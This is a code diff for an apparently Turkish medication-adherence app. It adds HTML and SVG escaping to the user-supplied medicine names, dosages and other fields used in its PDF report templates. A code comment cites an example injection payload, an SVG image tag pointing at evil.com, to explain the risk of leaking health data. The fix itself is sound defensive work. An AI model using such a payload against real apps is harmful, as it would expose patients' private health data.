@@ -143,6 +143,30 @@ function fixTurkishCharacters(text: string): string {
   return result;
 }
 
+/**
+ * HTML/SVG metin icerigi icin escape. Kullanici girdisi (med.name, dosage, note)
+ * dogrudan template icine yerlestirildiginde XSS / PHI exfiltrasyon riski olusturur.
+ * react-native-html-to-pdf arka planda HTML/SVG parser calistirdigindan
+ * <image href="http://evil.com/..."> gibi payload'lar saglik verisi sizintisina yol acabilir.
+ */
+function escapeHtml(text: string | null | undefined): string {
+  if (text == null) return '';
+  return String(text)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;');
+}
+
+/**
+ * SVG <text> elementi icin ek guvenlik: yeni satirlari bosluga cevirir,
+ * boylece cizgi baslangici komutlari (orn. </text> ile erken kapatma) engellenir.
+ */
+function escapeSvgText(text: string | null | undefined): string {
+  return escapeHtml(text).replace(/[\r\n]+/g, ' ');
+}
+
 function generateHTMLReport(data: ReportData, options: ReportOptions): string {
   const t = translations[options.language];
   const locale = options.language === 'tr' ? tr : undefined;
@@ -202,7 +226,7 @@ function generateHTMLReport(data: ReportData, options: ReportOptions): string {
     <circle cx="50" cy="50" r="${dR}" fill="none" stroke="${dColor}" stroke-width="${dSW}"
       stroke-dasharray="${dFill} ${dGap}" stroke-dashoffset="${dC * 0.25}" stroke-linecap="round"/>
     <text x="50" y="48" text-anchor="middle" font-size="22" font-weight="bold" fill="#111">%${pct}</text>
-    <text x="50" y="63" text-anchor="middle" font-size="8" fill="#555">${t.adherenceRate}</text>
+    <text x="50" y="63" text-anchor="middle" font-size="8" fill="#555">${escapeSvgText(t.adherenceRate)}</text>
   </svg>`;
 
   // Bar chart — renkli dolgu + yüzde yazısı (siyah beyazda yazı yeterli)
@@ -221,7 +245,7 @@ function generateHTMLReport(data: ReportData, options: ReportOptions): string {
         const name = fixTurkishCharacters(item.medicine.name);
         const tName = name.length > 20 ? name.substring(0, 20) + '…' : name;
         const bColor = item.rate >= 80 ? '#2E7D32' : item.rate >= 50 ? '#E65100' : '#C62828';
-        return `<text x="0" y="${y + barH / 2 + 4}" font-size="10" fill="#222">${tName}</text>
+        return `<text x="0" y="${y + barH / 2 + 4}" font-size="10" fill="#222">${escapeSvgText(tName)}</text>
       <rect x="145" y="${y}" width="${barMax}" height="${barH}" rx="2" fill="#f0f0f0" stroke="#ccc" stroke-width="0.5"/>
       <rect x="145" y="${y}" width="${w}" height="${barH}" rx="2" fill="${bColor}"/>
       <text x="${145 + barMax + 6}" y="${y + barH / 2 + 4}" font-size="10" font-weight="bold" fill="#111">%${item.rate}</text>`;
@@ -271,8 +295,8 @@ function generateHTMLReport(data: ReportData, options: ReportOptions): string {
       const freq = `${med.frequency}x ${t.perDay}`;
       const stock = med.stockEnabled ? ` · ${t.stock}: ${med.stockCount} ${t.remaining}` : '';
       return `<div class="med-card">
-      <div class="med-name">${fixTurkishCharacters(med.name)}</div>
-      <div class="med-info">${dosage ? dosage + ' · ' : ''}${freq}${stock}</div>
+      <div class="med-name">${escapeHtml(fixTurkishCharacters(med.name))}</div>
+      <div class="med-info">${escapeHtml(dosage ? dosage + ' · ' : '')}${escapeHtml(freq)}${escapeHtml(stock)}</div>
     </div>`;
     })
     .join('');
@@ -386,10 +410,10 @@ ${
         const scheduledDate = new Date(logEntry.scheduledTime);
         const isTaken = logEntry.status === 'taken';
         return `<tr>
-          <td>${format(scheduledDate, 'dd/MM', { locale })}</td>
-          <td>${fixTurkishCharacters(medicine?.name || '-')}</td>
-          <td>${format(scheduledDate, 'HH:mm')}</td>
-          <td class="${isTaken ? 'status-taken' : 'status-not'}">${isTaken ? '✓ ' + t.taken : '✗ ' + t.notTaken}</td>
+          <td>${escapeHtml(format(scheduledDate, 'dd/MM', { locale }))}</td>
+          <td>${escapeHtml(fixTurkishCharacters(medicine?.name || '-'))}</td>
+          <td>${escapeHtml(format(scheduledDate, 'HH:mm'))}</td>
+          <td class="${isTaken ? 'status-taken' : 'status-not'}">${isTaken ? '✓ ' + escapeHtml(t.taken) : '✗ ' + escapeHtml(t.notTaken)}</td>
         </tr>`;
       })
       .join('')}
